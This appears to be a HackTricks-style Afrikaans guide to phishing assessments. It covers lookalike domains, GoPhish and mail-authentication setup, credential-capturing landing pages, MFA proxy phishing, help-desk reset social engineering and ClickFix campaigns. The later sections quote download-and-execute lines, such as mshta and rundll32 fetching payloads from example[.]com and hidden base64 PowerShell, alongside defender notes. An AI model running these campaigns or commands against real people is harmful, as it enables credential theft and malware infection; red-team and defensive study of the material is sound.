# Phishing-metodologie

{{#include ../../banners/hacktricks-training.md}}

## Metodologie

1. Verken die slagoffer
   1. Kies die **slagofferdomein**.
   2. Doen basiese web-enumerasie om **aanmeldportale te vind** wat die slagoffer gebruik, en **besluit** watter een jy gaan **naboots**.
   3. Gebruik **OSINT** om **e-posadresse te vind**.
2. Berei die omgewing voor
   1. **Koop die domein** wat jy vir die phishing-assessering gaan gebruik.
   2. **Stel die verwante e-posdiensrekords op** (SPF, DMARC, DKIM, rDNS).
   3. Stel die VPS met **gophish** op.
3. Berei die veldtog voor
   1. Berei die **e-possjabloon** voor.
   2. Berei die **webblad** voor om die geloofsbriewe te steel.
4. Begin die veldtog!

## Genereer soortgelyke domeinname of koop ’n betroubare domein

### Tegnieke vir domeinnaamvariasie

- **Sleutelwoord**: Die domeinnaam **bevat** ’n belangrike **sleutelwoord** uit die oorspronklike domein (bv. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Subdomein met koppelteken**: Vervang die **punt met ’n koppelteken** in ’n subdomein (bv. www-zelster.com).
- **Nuwe TLD**: Gebruik dieselfde domein met ’n **nuwe TLD** (bv. zelster.org).
- **Homoglief**: **Vervang** ’n letter in die domeinnaam met **letters wat soortgelyk lyk** (bv. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Letteromruiling:** **Ruil twee letters** in die domeinnaam om (bv. zelsetr.com).
- **Enkelvoud/meervoud**: Voeg ’n “s” aan die einde van die domeinnaam by of verwyder dit (bv. zeltsers.com).
- **Weglating**: **Verwyder een** van die letters uit die domeinnaam (bv. zelser.com).
- **Herhaling:** **Herhaal een** van die letters in die domeinnaam (bv. zeltsser.com).
- **Vervanging**: Soos ’n homoglief, maar minder onopvallend. Vervang een van die letters in die domeinnaam, moontlik met ’n letter naby die oorspronklike letter op die sleutelbord (bv. zektser.com).
- **Subdomein**: Voeg ’n **punt** binne die domeinnaam in (bv. ze.lster.com).
- **Invoeging**: **Voeg ’n letter** by die domeinnaam in (bv. zerltser.com).
- **Ontbrekende punt**: Voeg die TLD agter die domeinnaam aan (bv. zelstercom.com).

**Outomatiese nutsmiddels**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Webwerwe**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Dit is **moontlik dat sommige gestoorde of tydens kommunikasie oorgedraagde bisse outomaties omgekeer word** weens verskeie faktore, soos sonvlamme, kosmiese strale of hardewarefoute.

Wanneer hierdie konsep **op DNS-versoeke toegepas word**, is dit moontlik dat die **domein wat die DNS-bediener ontvang** nie dieselfde is as die domein wat aanvanklik versoek is nie.

Byvoorbeeld, ’n enkele bisverandering in die domein "windows.com" kan dit verander na "windnws.com".

Aanvallers kan **dit uitbuit deur verskeie domeine te registreer wat deur bitflipping verkry is** en soortgelyk aan die slagoffer se domein is. Hulle doel is om wettige gebruikers na hul eie infrastruktuur te herlei.

Lees [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/) vir meer inligting.<sup>[[10]](#references)[[11]](#references)</sup>

### Koop ’n betroubare domein

Jy kan op [https://www.expireddomains.net/](https://www.expireddomains.net) soek na ’n verstreke domein wat jy kan gebruik.\
Om seker te maak dat die verstreke domein wat jy gaan koop **reeds goeie SEO het**, kan jy nagaan hoe dit gekategoriseer word op:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Ontdekking van e-posadresse

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% gratis)
- [https://phonebook.cz/](https://phonebook.cz) (100% gratis)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Om **meer** geldige e-posadresse te **ontdek**, of om die adresse wat jy reeds ontdek het te **verifieer**, kan jy kyk of jy dit met die slagoffer se SMTP-bedieners kan brute-force. [Vind hier uit hoe om e-posadresse te verifieer/ontdek](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Moet ook nie vergeet dat jy kan kyk of enige webportaal wat gebruikers **gebruik om toegang tot hul e-pos te kry**, kwesbaar is vir **username brute force** nie, en die kwesbaarheid kan uitbuit indien moontlik.

## GoPhish opstel

### Installasie

Jy kan dit aflaai by [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Laai dit af en pak dit uit binne `/opt/gophish`, en voer `/opt/gophish/gophish` uit.\
Die uitvoer sal jou ’n wagwoord vir die admin-gebruiker op poort 3333 gee. Gaan dus na daardie poort en gebruik dié geloofsbriewe om die admin-wagwoord te verander. Jy sal dalk daardie poort na plaaslik moet tonnel:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Konfigurasie

**TLS-sertifikaatkonfigurasie**

Voor hierdie stap moet jy die domein wat jy gaan gebruik **reeds gekoop** het, en dit moet na die **IP-adres van die VPS** wys waar jy **gophish** konfigureer.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**E-posopstelling**

Begin deur te installeer: `apt-get install postfix`

Voeg dan die domein by die volgende lêers:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Verander ook die waardes van die volgende veranderlikes in /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Wysig laastens die lêers **`/etc/hostname`** en **`/etc/mailname`** om jou domeinnaam te gebruik en **herbegin jou VPS.**

Skep nou ’n **DNS A-rekord** van `mail.<domain>` wat na die **IP-adres** van die VPS wys, en ’n **DNS MX-rekord** wat na `mail.<domain>` wys.

Kom ons toets nou om ’n e-pos te stuur:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Gophish-konfigurasie**

Stop gophish se uitvoering en kom ons stel dit op.\
Wysig `/opt/gophish/config.json` soos volg (let op die gebruik van https):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**Konfigureer die gophish-diens**

Om die gophish-diens te skep sodat dit outomaties kan begin en as ’n diens bestuur kan word, kan jy die lêer `/etc/init.d/gophish` met die volgende inhoud skep:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Voltooi die opstelling van die diens en toets dit deur:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Konfigureer posbediener en domein

### Wag en wees legitiem

Hoe ouer ’n domein is, hoe kleiner is die waarskynlikheid dat dit as spam bespeur sal word. Jy moet dus so lank as moontlik wag (minstens 1 week) voordat jy die phishing-assessering uitvoer. Verder sal die reputasie wat jy opbou beter wees as jy ’n bladsy oor ’n sektor met ’n goeie reputasie plaas.

Let daarop dat jy alles nou kan klaar konfigureer, selfs al moet jy ’n week wag.

### Konfigureer die omgekeerde DNS-rekord (rDNS)

Stel ’n rDNS (PTR)-rekord in wat die VPS se IP-adres na die domeinnaam laat wys.

### Sender Policy Framework (SPF)-rekord

Jy moet **’n SPF-rekord vir die nuwe domein konfigureer**. As jy nie weet wat ’n SPF-rekord is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Jy kan [https://www.spfwizard.net/](https://www.spfwizard.net) gebruik om jou SPF-beleid te genereer (gebruik die IP-adres van die VPS-masjien).

![SPF Wizard-vorm om ’n SPF-rekord vir ’n phishing-domein te genereer](<../../images/image (1037).png>)

Dit is die inhoud wat in ’n TXT-rekord binne die domein ingestel moet word:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Domeingebaseerde Boodskapverifikasie, Verslagdoening en Nakoming (DMARC)-rekord

Jy moet **’n DMARC-rekord vir die nuwe domein opstel**. As jy nie weet wat ’n DMARC-rekord is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Jy moet ’n nuwe DNS TXT-rekord skep wat die gasheernaam `_dmarc.<domain>` met die volgende inhoud teiken:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Jy moet **’n DKIM vir die nuwe domein konfigureer**. As jy nie weet wat ’n DKIM-rekord is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Hierdie tutoriaal is gebaseer op: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Jy moet die twee B64-waardes wat die DKIM-sleutel genereer, aaneenlas:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Toets jou e-poskonfigurasietelling

Jy kan dit doen deur [https://www.mail-tester.com/](https://www.mail-tester.com)\
Gaan net na die bladsy en stuur ’n e-pos na die adres wat hulle vir jou gee:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

Jy kan ook **jou e-posopstelling nagaan** deur ’n e-pos aan `check-auth@verifier.port25.com` te stuur en **die antwoord te lees** (hiervoor sal jy poort **25** moet **oopmaak** en die antwoord in die lêer _/var/mail/root_ nagaan as jy die e-pos as root stuur).\
Maak seker dat jy al die toetse slaag:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Jy kan ook ’n **boodskap na ’n Gmail-rekening onder jou beheer stuur** en die **e-posopskrifte** in jou Gmail-inkassie nagaan. `dkim=pass` behoort in die `Authentication-Results`-opskrifveld voor te kom.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Verwydering van die Spamhouse-swartlys

Die bladsy [www.mail-tester.com](https://www.mail-tester.com) kan aandui of jou domein deur Spamhouse geblokkeer word. Jy kan versoek dat jou domein/IP verwyder word by: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Verwydering van die Microsoft-swartlys

​​Jy kan versoek dat jou domein/IP verwyder word by [https://sender.office.com/](https://sender.office.com).

## Skep en begin GoPhish-veldtog

### Stuurprofiel

- Stel ’n **naam in om** die senderprofiel te identifiseer
- Besluit van watter rekening jy die phishing-e-posse gaan stuur. Voorstelle: _noreply, support, servicedesk, salesforce..._
- Jy kan die gebruikersnaam en wagwoord leeg laat, maar maak seker dat jy Ignore Certificate Errors merk

![Skep en begin GoPhish-veldtog - Stuurprofiel: Jy kan die gebruikersnaam en wagwoord leeg laat, maar maak seker dat jy Ignore Certificate Errors merk](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Dit word aanbeveel om die funksie "**Send Test Email**" te gebruik om te toets of alles werk.\
> Ek beveel aan dat jy die toets-e-posse na 10min-posadresse stuur om te voorkom dat jy tydens toetsing op ’n swartlys beland.

### E-possjabloon

- Stel ’n **naam in om** die sjabloon te identifiseer
- Skryf dan ’n **onderwerp** (niks vreemds nie; net iets wat jy sou verwag om in ’n gewone e-pos te lees)
- Maak seker dat jy "**Add Tracking Image**" gemerk het
- Skryf die **e-possjabloon** (jy kan veranderlikes gebruik soos in die volgende voorbeeld):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Let daarop dat **dit aanbeveel word om ’n handtekening uit ’n e-pos van die kliënt te gebruik om die e-pos geloofwaardiger te maak**. Voorstelle:

- Stuur ’n e-pos na ’n **niebestaande adres** en kyk of die antwoord ’n handtekening bevat.
- Soek **publieke e-posadresse** soos info@ex.com, press@ex.com of public@ex.com, stuur vir hulle ’n e-pos en wag vir die antwoord.
- Probeer om **’n geldige e-posadres wat jy ontdek het** te kontak en wag vir die antwoord.

![Sending Profile - Email Template: Probeer om ’n geldige e-posadres wat jy ontdek het te kontak en wag vir die antwoord](<../../images/image (80).png>)

> [!TIP]
> Met die Email Template kan jy ook **lêers aanheg om te stuur**. As jy ook NTLM-uitdagings wil steel deur spesiaal vervaardigde lêers/dokumente te gebruik, [lees hierdie bladsy](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landingsbladsy

- Skryf ’n **naam**
- **Skryf die HTML-kode** van die webblad. Let daarop dat jy webblaaie kan **invoer**.
- Merk **Capture Submitted Data** en **Capture Passwords**
- Stel ’n **aanstuur** in

![Email Template - Landingsbladsy: Merk Capture Submitted Data en Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Gewoonlik sal jy die HTML-kode van die bladsy moet wysig en ’n paar toetse plaaslik moet doen (dalk met ’n Apache-bediener) **totdat jy tevrede is met die resultate.** Skryf dan daardie HTML-kode in die blokkie.\
> Let daarop dat as jy **statiese hulpbronne** vir die HTML moet gebruik (dalk ’n paar CSS- en JS-bladsye), kan jy hulle in _**/opt/gophish/static/endpoint**_ stoor en hulle dan vanaf _**/static/\<filename>**_ verkry.

> [!TIP]
> Vir die aanstuur kan jy **gebruikers na die slagoffer se wettige hoofwebblad aanstuur**, of hulle byvoorbeeld na _/static/migration.html_ aanstuur, ’n **laaisirkel (**[**https://loading.io/**](https://loading.io)**) vir 5 sekondes vertoon en dan aandui dat die proses suksesvol was**.

### Gebruikers en groepe

- Stel ’n naam in
- **Voer die data in** (let daarop dat jy die voornaam, van en e-posadres van elke gebruiker nodig het om die template vir die voorbeeld te gebruik)

![Landingsbladsy - Gebruikers en groepe: Voer die data in (let daarop dat jy die voornaam, van en e-posadres van elke gebruiker nodig het om die template vir die voorbeeld te gebruik)](<../../images/image (163).png>)

### Veldtog

Skep laastens ’n veldtog deur ’n naam, die e-pos-template, die landingsbladsy, die URL, die sending profile en die groep te kies. Let daarop dat die URL die skakel sal wees wat aan die slagoffers gestuur word.

Let daarop dat die **Sending Profile jou toelaat om ’n toets-e-pos te stuur om te sien hoe die finale phishing-e-pos sal lyk**:

![Gebruikers en groepe - Veldtog: Let daarop dat die Sending Profile jou toelaat om ’n toets-e-pos te stuur om te sien hoe die finale phishing-e-pos sal lyk](<../../images/image (192).png>)

Wanneer alles gereed is, begin die veldtog!

## Webwerfkloning

As jy om enige rede die webwerf wil kloon, kyk na die volgende bladsy:


{{#ref}}
clone-a-website.md
{{#endref}}

## Dokumente en lêers met backdoors

In sommige phishing-assessering (hoofsaaklik vir Red Teams) sal jy ook **lêers met ’n soort backdoor wil stuur** (dalk ’n C2, of dalk net iets wat ’n verifikasie sal aktiveer).\
Kyk na die volgende bladsy vir ’n paar voorbeelde:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Die vorige aanval is nogal slim omdat jy ’n regte webwerf namaak en die inligting insamel wat die gebruiker invoer. Ongelukkig sal **hierdie inligting jou nie toelaat om die misleide gebruiker na te boots nie** as die gebruiker nie die korrekte wagwoord ingevoer het nie, of as die toepassing wat jy nagemaak het met 2FA opgestel is.

Dit is waar nutsmiddels soos [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) en [**muraena**](https://github.com/muraenateam/muraena) nuttig is. Hierdie nutsmiddel laat jou toe om ’n MitM-agtige aanval uit te voer. Basies werk die aanval soos volg:

1. Jy **boots** die aanmeldvorm van die regte webblad na.
2. Die gebruiker **stuur** sy **geloofsbriewe** na jou vals bladsy, en die nutsmiddel stuur dit na die regte webblad en **kontroleer of die geloofsbriewe werk**.
3. As die rekening met **2FA** opgestel is, sal die MitM-bladsy daarvoor vra. Sodra die **gebruiker dit invoer**, stuur die nutsmiddel dit na die regte webblad.
4. Sodra die gebruiker geverifieer is, sal jy (as aanvaller) **die geloofsbriewe, die 2FA, die cookie en enige inligting van elke interaksie vasgelê het** terwyl die nutsmiddel ’n MitM-aanval uitvoer.

### Via VNC

Wat as jy die slagoffer, in plaas daarvan om hom na ’n **kwaadwillige bladsy te stuur** wat soos die oorspronklike lyk, na ’n **VNC-sessie stuur met ’n blaaier wat aan die regte webblad gekoppel is**? Jy sal kan sien wat hy doen, die wagwoord, die MFA wat gebruik word, die cookies, ensovoorts, steel.\
Jy kan dit met [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) doen.<sup>[[3]](#references)[[4]](#references)</sup>

## Bespeur die opsporing

Een van die beste maniere om te weet of jy uitgevang is, is natuurlik om **jou domein in swartlyste te soek**. As dit gelys is, is jou domein op een of ander manier as verdag bespeur.\
Een maklike manier om te kyk of jou domein in enige swartlys verskyn, is om [https://malwareworld.com/](https://malwareworld.com) te gebruik.

Daar is egter ander maniere om te weet of die slagoffer **aktief na verdagte phishing-aktiwiteit in die natuur soek**, soos verduidelik in:


{{#ref}}
detecting-phising.md
{{#endref}}

Jy kan **’n domein met ’n baie soortgelyke naam as die slagoffer se domein koop** en/of **’n sertifikaat vir ’n subdomein** van ’n domein wat deur jou beheer word **genereer wat die sleutelwoord** van die slagoffer se domein **bevat**. As die **slagoffer** enige soort **DNS- of HTTP-interaksie** daarmee uitvoer, sal jy weet dat **hy aktief na verdagte domeine soek**, en jy sal baie diskreet moet wees.<sup>[[2]](#references)</sup>

### Evalueer die phishing

Gebruik [**Phishious** ](https://github.com/Rices/Phishious)om te evalueer of jou e-pos in die spam-lêergids gaan beland, geblokkeer gaan word of suksesvol sal wees.

## Hoë-aanraking identiteitskompromittering (MFA-terugstelling deur hulptoonbank)

Moderne inbraakgroepe slaan toenemend e-poslokmiddels heeltemal oor en **teiken die dienshulptoonbank-/identiteitsherstelwerkvloei direk** om MFA te omseil. Die aanval is volledig “living-off-the-land”: sodra die operateur geldige geloofsbriewe besit, beweeg hulle lateraal met ingeboude administrasienutsmiddels – geen malware is nodig nie.<sup>[[6]](#references)</sup>

### Aanvalsvloei
1. Verken die slagoffer
   * Versamel persoonlike en korporatiewe besonderhede van LinkedIn, datalekkasies, openbare GitHub, ensovoorts.
   * Identifiseer identiteite met hoë waarde (bestuurders, IT, finansies) en bepaal die **presiese hulptoonbankproses** vir wagwoord-/MFA-terugstelling.
2. Intydse social engineering
   * Bel, stuur ’n Teams-boodskap of gesels met die hulptoonbank terwyl jy jou as die teiken voordoen (dikwels met **vervalste beller-ID** of **nagebootste stem**).
   * Verskaf die voorheen versamelde PII om kennisgebaseerde verifikasie te slaag.
   * Oortuig die agent om die **MFA-geheim terug te stel** of ’n **SIM-swap** op ’n geregistreerde selfoonnommer uit te voer.
3. Onmiddellike aksies ná toegang (≤60 min in werklike gevalle)
   * Vestig ’n vastrapplek deur enige web-SSO-portaal.
   * Enumereer AD / AzureAD met ingeboude nutsmiddels (geen binaries word laat val nie):
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Lateral movement met **WMI**, **PsExec** of wettige **RMM**-agente wat reeds in die omgewing gewitelys is.

### Opsporing & versagting
* Behandel identiteitsherstel deur die hulptoonbank as ’n **bevoorregte bewerking** – vereis stap-op-verifikasie & bestuurdergoedkeuring.
* Ontplooi **Identity Threat Detection & Response (ITDR)** / **UEBA**-reëls wat waarsku oor:  
  * MFA-metode verander + verifikasie vanaf ’n nuwe toestel / geografiese ligging.  
  * Onmiddellike voorregverhoging van dieselfde principal (gebruiker-→-admin).  
* Neem hulptoonbankoproepe op en vereis ’n **terugbelling na ’n reeds-geregistreerde nommer** voordat enige terugstelling plaasvind.
* Implementeer **Just-In-Time (JIT) / Privileged Access** sodat nuut-teruggestelde rekeninge nie outomaties hoëvoorregtokens erf nie.

---

## Misleiding op skaal – SEO poisoning & “ClickFix”-veldtogte
Gewone aanvalsgroepe vergoed vir die koste van intensiewe operasies met massa-aanvalle wat **soekenjins & advertensienetwerke in die afleweringskanaal verander**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** stoot ’n vals resultaat soos `chromium-update[.]site` na die bopunt van soekadvertensies.
2. Die slagoffer laai ’n klein **first-stage loader** af (dikwels JS/HTA/ISO). Voorbeelde wat deur Unit 42 waargeneem is:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Die loader eksfiltreer blaaierkoekies + geloofsbrondatabasisse, en laai dan ’n **silent loader** af wat *intyds* besluit of die volgende ontplooi moet word:
   * RAT (bv. AsyncRAT, RustDesk)
   * ransomware / wiper
   * persistence component (register-Run-sleutel + geskeduleerde taak)

### Verhardingswenke
* Blokkeer nuut-geregistreerde domeine & dwing **Advanced DNS / URL Filtering** op *soekadvertensies* sowel as e-pos af.
* Beperk sagteware-installasie tot ondertekende MSI / Store-pakkette; weier die uitvoering van `HTA`, `ISO`, `VBS` volgens beleid.
* Monitor vir kinderprosesse van blaaiers wat installeerders oopmaak:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* Soek na LOLBins wat dikwels deur eerste-fase-laaiers misbruik word (bv. `regsvr32`, `curl`, `mshta`).

### Kaping van ’n aflaaiknoppieklik met TDS-oordrag
Sommige vals sagtewareportale laat die sigbare aflaai-`href` na die **regte** GitHub-/vrystellings-URL wys, maar kaap die gebruiker se **eerste** interaksie in JavaScript en stuur die slagoffer eerder in ’n **Traffic Distribution System (TDS)**-ketting in.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Sleutelkenmerke:
- Die hook loop gewoonlik in die **capture phase** (`true`) op `document`, dus vuur dit af voordat werfhandlers loop.
- Chrome gebruik dikwels `mousedown` in plaas van `click` om die redirect aan ’n geldige **user gesture** te koppel en die omseiling van popup blockers te verbeter.
- Sommige variante maak vooraf `about:blank` oop of simuleer `target="_blank"`-klikke op `<a>`-elemente, en ken eers later die TDS-URL toe.
- Limiete aan die browser-kant word dikwels in `localStorage` gestoor, dus kan die **eerste klik** die malware bereik terwyl herlaaie/herprobeerslae terugval op die skakel wat onskuldig lyk.
- Die TDS kan filtreer volgens referrer, intreedomein, GEO, browser-/toestelfingerafdruk, VPN-/datacentertoetse, klik-konteks en tellers per sessie, wat ontleder-herhalings nie-deterministies maak.

Idees vir verdedigers:
- Vergelyk die **vertoonde** `href` met die **werklike** navigasieteiken wat gegenereer word wanneer daarop geklik word.
- Soek na `document.addEventListener(..., true)`-handlers wat beide `preventDefault()` en `stopImmediatePropagation()` aanroep rondom `window.open`, `about:blank` of gesimuleerde ankervoorwerpe se klikke.
- Behandel groepe nuut geregistreerde sagteware-aflaaidomeine wat almal dieselfde CloudFront/JS-stadium laai as ’n sterk SEO-poisoning/TDS-patroon.

### ClickFix vanaf vals verifikasiebladsye + LOLBAS-aflaaie wat soos argiewe lyk
Sommige TDS-takke eindig op ’n vals verifikasiebladsy (Cloudflare/IUAM-styl) wat die slagoffer opdrag gee om ’n vertroude Windows-binêre lêer soos die volgende uit te voer:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Notas:
- `mshta.exe` voer die **HTA/VBScript aan die begin van die response** uit, selfs al gee die URL voor dat dit ’n `.7z`-argief is; data wat aan die argief geheg is, kan ’n blote lokmiddel wees.
- Vervolgfases lieg dikwels steeds oor die lêertipe (`.rtf` vir PowerShell, `.asar` vir Python, ZIP-lêers met opgevulde binaries) en skakel dan oor na **manual PE mapping / in-memory execution**.
- As jy op een van hierdie kettings reageer, bewaar **network + memory vanaf die eerste suksesvolle uitvoering**: latere herhalings wys dalk net ’n onskadelike installer-/SFX-pad, of misluk omdat die payload-/key-vrystelling aan die oorspronklike TDS-sessie gekoppel was.

### ClickFix DLL-delivery tradecraft (vals CERT-opdatering)
* Lokmiddel: ’n gekloonde nasionale CERT-advies met ’n **Update**-knoppie wat stap-vir-stap-“fix”-instruksies vertoon. Slagoffers word aangesê om ’n batch-lêer uit te voer wat ’n DLL aflaai en dit via `rundll32` uitvoer.<sup>[[12]](#references)</sup>
* Tipiese batch-ketting wat waargeneem is:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` plaas die payload in `%TEMP%`; ’n kort wagtyd verberg netwerk-jitter, waarna `rundll32` die uitgevoerde toegangspunt (`notepad`) aanroep.
* Die DLL stuur die gasheeridentiteit as ’n beacon en poll C2 elke paar minute. Afstandstaakopdragte kom aan as **base64-gekodeerde PowerShell** wat versteek uitgevoer word, met beleidsomseiling:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Dit behou C2-buigsaamheid (die bediener kan take verander sonder om die DLL op te dateer) en versteek konsolevensters. Soek na PowerShell-kinderprosesse van `rundll32.exe` waarin `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` saam voorkom.
* Verdedigers kan HTTP(S)-callbacks soek in die vorm `...page.php?tynor=<COMPUTER>sss<USER>` en polling-intervalle van 5 minute ná DLL-laai.

---

## Phishing-bedrywighede versterk deur AI
Aanvallers kombineer nou **LLM- en stemkloning-API’s** om volledig gepersonaliseerde lokboodskappe en interaksie in real time te skep.

| Laag | Voorbeeldgebruik deur bedreigingsakteur |
|-------|-----------------------------|
|Outomatisering|Genereer en stuur >100 k e-posse / SMS-boodskappe met ewekansige bewoording en tracking-skakels.|
|Generatiewe AI|Skep *eenmalige* e-posse wat na openbare M&A verwys, met binnegrappies van sosiale media; gebruik ’n deepfake-CEO-stem in ’n callback-bedrogspul.|
